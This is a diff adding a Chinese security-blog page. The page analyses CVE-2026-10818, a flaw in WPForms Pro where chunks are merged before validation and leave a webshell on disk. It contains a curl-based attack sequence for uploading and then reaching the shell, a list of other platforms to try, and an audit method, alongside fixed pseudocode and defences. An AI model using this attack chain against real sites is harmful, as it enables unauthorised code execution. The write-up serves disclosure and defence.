@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <link rel="icon" type="image/png" sizes="32x32" href="/assets/images/cat-final.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/assets/images/cat-final.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="/assets/images/cat-final.png">
+    <link rel="shortcut icon" href="/assets/images/cat-final.png">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>分块上传的致命时序：合并先于验证→Webshell残留RCE — DARKSEC</title>
+<meta name="description" content="WPForms Pro的分块上传管线中，文件合并完成后才做类型校验——校验失败不清理已合并文件→webshell残留→RCE。CVE-2026-10818深度分析。">
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/css/style.css">
+</head>
+<body>
+<div class="container">
+  <header>
+    <a href="/" class="logo">DARK<span>SEC</span> <img src="/assets/images/cat-final.png" alt="cat" style="width:28px;height:28px;vertical-align:middle;margin-left:4px;"></a>
+    <nav>
+      <a href="/">首页</a>
+      <a href="/posts/" class="active">文章</a>
+      <a href="/tags/">标签</a>
+      <a href="/about.html">关于</a>
+    </nav>
+    <button class="mobile-menu" onclick="document.querySelector('nav').classList.toggle('show')">☰</button>
+  </header>
+
+  <main>
+    <a href="/" class="back-link">← 返回首页</a>
+
+    <article>
+      <div class="article-header">
+        <div class="category">◆ 文件上传 / 竞态攻击</div>
+        <h1>分块上传的致命时序：合并先于验证→Webshell残留RCE 🔥</h1>
+        <div class="article-meta">
+          <span>📅 2026-07-25</span>
+          <span>⏱ 14 min read</span>
+          <span>🏷 分块上传 / TOCTOU / RCE / CVE</span>
+        </div>
+      </div>
+
+      <div class="article-content">
+        <div class="toc">
+          <h4>◆ 目录</h4>
+          <ul>
+            <li><a href="#intro">漏洞概述</a></li>
+            <li><a href="#pipeline">分块上传管线分析</a></li>
+            <li><a href="#exploit">攻击链构造</a></li>
+            <li><a href="#root">根本原因</a></li>
+            <li><a href="#migration">迁移目标</a></li>
+            <li><a href="#audit">审计方法</a></li>
+            <li><a href="#defense">防御建议</a></li>
+          </ul>
+        </div>
+
+        <h2 id="intro">🎯 漏洞概述</h2>
+        <p>分块上传（Chunked Upload）是大文件上传的标准方案——文件被切分为多个分块逐个上传，服务端合并后再做处理。这个流程看似合理，但<strong>时序缺陷</strong>可以让攻击者上传任意文件并执行。</p>
+
+        <p>CVE-2026-10818（WPForms Pro，CVSS 8.1）揭示了一个致命的TOCTOU漏洞：分块合并<strong>先于</strong>文件类型验证执行，且验证失败后<strong>不删除已合并文件</strong>。攻击者只需将PHP webshell拆分为多个无害分块上传，服务端合并完成后校验失败——但webshell已经静静躺在Web可访问的路径下。</p>
+
+        <blockquote>
+          <p>🔥 核心洞察：<strong>"验证失败→清理文件"必须是原子操作</strong>。但很多实现中，清理代码只存在于验证成功的分支——开发者假设"验证失败就return，文件会自动消失"。这种假设在分块上传的分布式时序下完全不成立。</p>
+        </blockquote>
+
+        <h2 id="pipeline">🔧 分块上传管线分析</h2>
+
+        <p>正常的分块上传管线有三个阶段：</p>
+
+        <pre><code>┌─────────────────────────────────────────────────┐
+│  Phase 1: 接收分块                                │
+│  POST /upload/chunk  →  写入临时目录              │
+│  chunk_0.tmp, chunk_1.tmp, chunk_2.tmp ...        │
+├─────────────────────────────────────────────────┤
+│  Phase 2: 合并分块                                │
+│  POST /upload/finalize → 合并所有chunk为最终文件   │
+│  merge(chunks) → /uploads/final_file.ext          │
+├─────────────────────────────────────────────────┤
+│  Phase 3: 类型验证                                │
+│  check_mime_type(final_file)                      │
+│  if FAIL → return error (⚠️ 文件未删除!)          │
+│  if PASS → move to permanent storage              │
+└─────────────────────────────────────────────────┘</code></pre>
+
+        <p>问题出在<strong>Phase 2和Phase 3之间</strong>：</p>
+
+        <ul>
+          <li>🎯 Phase 2的合并操作<strong>无条件写入磁盘</strong></li>
+          <li>🎯 Phase 3的验证失败只返回错误码，<strong>不清理Phase 2的产物</strong></li>
+          <li>🎯 合并后的文件路径是<strong>可预测的</strong>（基于原始文件名或UUID）</li>
+          <li>🎯 临时上传目录通常在<strong>Web根目录</strong>下可直接访问</li>
+        </ul>
+
+        <h2 id="exploit">💥 攻击链构造</h2>
+
+        <p>攻击者只需三步：</p>
+
+        <pre><code># Step 1: 将PHP webshell拆分为多个分块
+split -b 1024 shell.php chunk_
+
+# Step 2: 逐个上传分块（每个分块内容本身无害）
+for chunk in chunk_*; do
+  curl -X POST "https://target.com/wp-json/wpforms/v1/upload/chunk" \
+    -H "Authorization: Bearer TOKEN" \
+    -F "file=@$chunk" \
+    -F "chunk_index=$i" \
+    -F "total_chunks=3" \
+    -F "upload_id=attacker-controlled-uuid"
+done
+
+# Step 3: 触发合并（验证会失败，但文件已写入）
+curl -X POST "https://target.com/wp-json/wpforms/v1/upload/finalize" \
+  -H "Authorization: Bearer TOKEN" \
+  -F "upload_id=attacker-controlled-uuid" \
+  -F "filename=shell.php"
+# 响应: {"error": "File type not allowed"}
+
+# Step 4: 直接访问已合并的webshell（它还在！）
+curl "https://target.com/wp-content/uploads/wpforms/temp/shell.php"
+# → RCE achieved 🔥</code></pre>
+
+        <blockquote>
+          <p>🎯 关键点：分块上传的元数据（upload_id、filename、chunk_index）通常由<strong>客户端</strong>提供。攻击者可以控制最终文件名、分块顺序、甚至upload_id——这些都增加了攻击面。</p>
+        </blockquote>
+
+        <h2 id="root">🧠 根本原因</h2>
+
+        <p>这个漏洞的本质是<strong>分布式操作的状态管理缺陷</strong>：</p>
+
+        <pre><code>// 伪代码：漏洞实现
+function finalize_upload(upload_id) {
+    chunks = get_temp_chunks(upload_id)
+    final_path = merge_chunks(chunks, upload_id)  // ← 写入磁盘
+    
+    if (!is_valid_mime_type(final_path)) {
+        return error("File type not allowed")  // ← 没有删除final_path！
+    }
+    
+    move_to_permanent(final_path)
+    return success()
+}
+
+// 伪代码：安全实现
+function finalize_upload(upload_id) {
+    chunks = get_temp_chunks(upload_id)
+    final_path = merge_chunks(chunks, upload_id)
+    
+    if (!is_valid_mime_type(final_path)) {
+        unlink(final_path)  // ← 必须清理！
+        cleanup_temp_chunks(chunks)  // ← 也要清理分块！
+        return error("File type not allowed")
+    }
+    
+    move_to_permanent(final_path)
+    cleanup_temp_chunks(chunks)
+    return success()
+}</code></pre>
+
+        <p>根本原因的三层拆解：</p>
+        <ul>
+          <li><strong>时序错误</strong>：验证应在写入之前，或写入+验证+清理必须是原子操作</li>
+          <li><strong>错误分支不完整</strong>：开发者只处理了"happy path"的资源清理，遗漏了"error path"</li>
+          <li><strong>分块上传放大了攻击窗口</strong>：多个请求的分布式操作比单文件上传更难管理中间状态</li>
+        </ul>
+
+        <h2 id="migration">🔄 迁移目标</h2>
+
+        <p>这个攻击模式适用于所有"分块上传→合并→后验证"的实现：</p>
+
+        <ul>
+          <li>🎯 <strong>WordPress表单插件</strong>：WPForms、Gravity Forms、Elementor Forms、Ninja Forms</li>
+          <li>🎯 <strong>云存储multipart upload</strong>：AWS S3的abort不完整→碎片残留</li>
+          <li>🎯 <strong>文件处理服务</strong>：Cloudinary、Imgix的上传pipeline</li>
+          <li>🎯 <strong>视频平台</strong>：分片上传（Bilibili、YouTube的上传组件）</li>
+          <li>🎯 <strong>Web框架</strong>：Next.js/Vercel的Server Action文件上传</li>
+        </ul>
+
+        <h2 id="audit">🔍 审计方法</h2>
+
+        <p>审计分块上传功能的四步法：</p>
+
+        <pre><code># 1. 找到分块上传端点
+grep -rn "chunk" --include="*.js" --include="*.py" --include="*.php" .
+grep -rn "resumable\|multipart_upload" .
+
+# 2. 追踪finalize/complete函数
+# 检查：合并后是否立即做MIME检查？
+# 检查：MIME检查失败后是否删除文件？
+
+# 3. 测试攻击
+# 上传一个PHP文件的分块 → 触发finalize → 检查响应
+# 即使响应是"文件类型不允许"，也尝试访问合并后的文件路径
+
+# 4. 检查临时目录
+# 分块合并的临时路径在哪？是否在Web可访问目录下？
+# 路径是否可预测（基于UUID、序列号、原始文件名）？</code></pre>
+
+        <h2 id="defense">🛡️ 防御建议</h2>
+
+        <p>三层防御：</p>
+
+        <pre><code># 防御层1：合并前验证（最佳方案）
+function finalize_upload(upload_id):
+    chunks = get_temp_chunks(upload_id)
+    # 先检查所有分块的内容类型
+    for chunk in chunks:
+        if not is_valid_chunk(chunk):
+            cleanup(chunks)
+            return error()
+    # 验证通过后才合并
+    final_path = merge_chunks(chunks)
+    move_to_permanent(final_path)
+
+# 防御层2：合并后立即验证+清理（兜底方案）
+function finalize_upload(upload_id):
+    final_path = merge_chunks(chunks)
+    if not is_valid(final_path):
+        unlink(final_path)  # 原子性清理
+        cleanup(chunks)
+        return error()
+
+# 防御层3：临时目录隔离
+# 合并目录不在Web根目录下
+# 使用不可预测的路径（随机UUID）
+# 设置定时清理任务删除过期临时文件</code></pre>
+
+        <blockquote>
+          <p>🔥 记住：<strong>文件写入到验证之间的任何时间窗口都是攻击窗口</strong>。分块上传比单文件上传的窗口更大——因为多个请求是分布式操作，中间状态更难管理。在设计上传管线时，必须假设验证会失败，并提前规划好失败路径的资源清理。</p>
+        </blockquote>
+
+        <p style="text-align:center;margin-top:40px;color:var(--text-dim);font-style:italic;">~ 感谢阅读 nya~ 🐱✨</p>
+
+        <div class="article-tags">
+          <span class="tag pink">文件上传</span>
+          <span class="tag">TOCTOU</span>
+          <span class="tag purple">CVE</span>
+          <span class="tag yellow">RCE</span>
+          <span class="tag">竞态攻击</span>
+          <span class="tag pink">WPForms</span>
+        </div>
+      </div>
+    </article>
+  </main>
+
+  <footer>
+    <div class="footer-content">
+      <p>© 2026 <span class="neon-text">DARKSEC</span> CYBERCAT SECURITY LAB <img src="/assets/images/cat-final.png" alt="cat" style="width:1.2em;height:1.2em;vertical-align:middle;"></p>
+    </div>
+  </footer>
+</div>
+</body>
+</html>
